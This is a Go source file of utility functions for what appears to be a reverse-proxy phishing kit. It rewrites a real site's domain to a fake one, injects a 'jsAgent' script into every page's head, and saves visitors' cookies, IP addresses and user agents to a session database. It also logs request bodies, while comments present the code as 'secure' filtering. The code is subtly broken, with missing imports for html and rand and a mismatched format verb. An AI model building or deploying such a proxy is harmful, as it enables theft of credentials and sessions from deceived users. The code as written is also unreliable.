package proxy

import (
	"bytes"
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

// --- Logging Utilities ---

// Enhanced request logging with sensitive data filtering
func logRequestData(sessionID string, req *http.Request) {
	// Filter sensitive headers
	filteredHeaders := make(http.Header)
	for k, v := range req.Header {
		if strings.EqualFold(k, "Authorization") || strings.EqualFold(k, "Cookie") {
			filteredHeaders[k] = []string{"[REDACTED]"}
		} else {
			filteredHeaders[k] = v
		}
	}

	data := fmt.Sprintf("[%s] %s %s\nSessionID: %s\nHeaders: %v\nUser-Agent: %s\nIP: %s\n",
		time.Now().Format(time.RFC3339Nano),
		req.Method,
		req.URL.String(),
		sessionID,
		filteredHeaders,
		req.UserAgent(),
		getRealIP(req))

	if req.Method == "POST" {
		body, _ := io.ReadAll(req.Body)
		req.Body = io.NopCloser(bytes.NewReader(body))
		
		// Filter sensitive POST data
		if strings.Contains(req.Header.Get("Content-Type"), "application/json") {
			var jsonData map[string]interface{}
			if err := json.Unmarshal(body, &jsonData); err == nil {
				if _, exists := jsonData["password"]; exists {
					jsonData["password"] = "[REDACTED]"
					body, _ = json.Marshal(jsonData)
				}
			}
		}
		
		data += fmt.Sprintf("Body: %s\n", string(body))
	}

	writeLog(data)
}

// Secure session data logging
func logSessionData(key, value string) {
	// Redact sensitive tokens
	if strings.Contains(key, "token") || strings.Contains(key, "secret") {
		value = "[REDACTED]"
	}
	writeLog(fmt.Sprintf("[%s] %s: %s\n", 
		time.Now().Format(time.RFC3339Nano), key, value))
}

// Thread-safe log writing
func writeLog(data string) {
	logMutex.Lock()
	defer logMutex.Unlock()
	
	if _, err := logFile.WriteString(data); err != nil {
		log.Printf("Failed to write log: %v", err)
	}
}

// --- Database Utilities ---

// Atomic session save operation
func saveSessionToDB(session Session) error {
	tx, err := db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	_, err = tx.Exec(`INSERT OR REPLACE INTO sessions 
		(id, cookies, user_agent, ip, last_active, metadata) 
		VALUES (?, ?, ?, ?, ?, ?)`,
		session.ID,
		session.Cookies,
		session.UserAgent,
		session.IP,
		session.LastActive.Format(time.RFC3339Nano),
		session.Metadata)
	
	if err != nil {
		return fmt.Errorf("failed to save session: %w", err)
	}
	
	return tx.Commit()
}

// --- Network Utilities ---

// Get real client IP considering proxies
func getRealIP(r *http.Request) string {
	for _, h := range []string{"X-Forwarded-For", "X-Real-IP"} {
		if ip := r.Header.Get(h); ip != "" {
			return strings.Split(ip, ",")[0]
		}
	}
	
	if ip, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		return ip
	}
	
	return r.RemoteAddr
}

// Create secure TLS configuration
func createTLSConfig() *tls.Config {
	return &tls.Config{
		MinVersion: tls.VersionTLS12,
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
		},
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
	}
}

// --- Content Manipulation Utilities ---

func replaceAllDomains(body []byte) []byte {
	domainMappings := map[string]string{
		targetURL:                     "https://" + fakeDomain,
		"realwebsite.com":             fakeDomain,
		strings.TrimPrefix(targetURL, "https://"): fakeDomain,
		strings.TrimPrefix(targetURL, "http://"):  fakeDomain,
	}
	
	for old, new := range domainMappings {
		body = bytes.ReplaceAll(body, []byte(old), []byte(new))
	}
	return body
}

func injectJS(body []byte) []byte {
	// Only inject into HTML documents
	if !bytes.Contains(body, []byte("<html")) {
		return body
	}

	// Parse and modify DOM properly
	doc, err := html.Parse(bytes.NewReader(body))
	if err != nil {
		return body
	}

	var injectNode = &html.Node{
		Type: html.ElementNode,
		Data: "script",
		Attr: []html.Attribute{
			{Key: "src", Val: "/" + jsAgent},
		},
	}

	var f func(*html.Node)
	f = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "head" {
			n.AppendChild(injectNode)
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			f(c)
		}
	}
	f(doc)

	var buf bytes.Buffer
	html.Render(&buf, doc)
	return buf.Bytes()
}

func blockSensitiveContent(body []byte) []byte {
	for _, keyword := range blockedKeywords {
		re := regexp.MustCompile(`(?i)(` + regexp.QuoteMeta(keyword) + `)`)
		body = re.ReplaceAll(body, []byte("[REDACTED]"))
	}
	return body
}

// --- Session Utilities ---

func getSessionID(r *http.Request) string {
	if cookie, err := r.Cookie("session_id"); err == nil {
		return cookie.Value
	}
	return r.Header.Get("X-Session-ID")
}

func bindSession(body []byte, r *http.Request) []byte {
	sessionID := getSessionID(r)
	if sessionID == "" {
		return body
	}

	script := fmt.Sprintf(`
		<script nonce="%x">
			sessionStorage.setItem('session_id','%s');
			localStorage.setItem('session_data', JSON.stringify({
				ip: '%s',
				userAgent: '%s',
				lastActive: %d
			}));
		</script>`,
		generateNonce(),
		sessionID,
		getRealIP(r),
		r.UserAgent(),
		time.Now().Unix(),
	)

	return bytes.Replace(body, []byte("</body>"), append([]byte(script), []byte("</body>")...), 1)
}

func generateNonce() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return fmt.Sprintf("%x", buf)
}